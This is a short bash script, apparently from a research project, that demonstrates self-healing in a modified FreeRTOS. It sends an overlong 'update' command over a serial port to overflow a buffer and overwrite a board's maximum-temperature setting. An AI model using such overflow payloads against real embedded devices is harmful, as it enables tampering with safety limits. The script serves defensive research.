#!/bin/bash

#
# An example attack to demonstrate self-healing functionality of adjusted FreeRTOS.
#
# @author:       Michael Denzel
# @email:        md.research@mailbox.org
# @license:      GNU General Public License 2.0 or later
# @date:         2017-03-17
# @version:      0.1
#

### CONFIG ###
io=/dev/ttyUSB0 #the serial connection to the i.MX53 Quick Start Board
##############

if [ $# -eq 1 ]; then
    hex=`echo "obase=16; $1" | bc` #cast the temperature into base 16
    echo -e "update 1234561234567890\x$hex" > $io #overflow buffer and write the new temperature
    echo -e "status" > $io #send a status to show self-healing
else
    echo "Usage: $0 <number (new max temperature)>"
fi
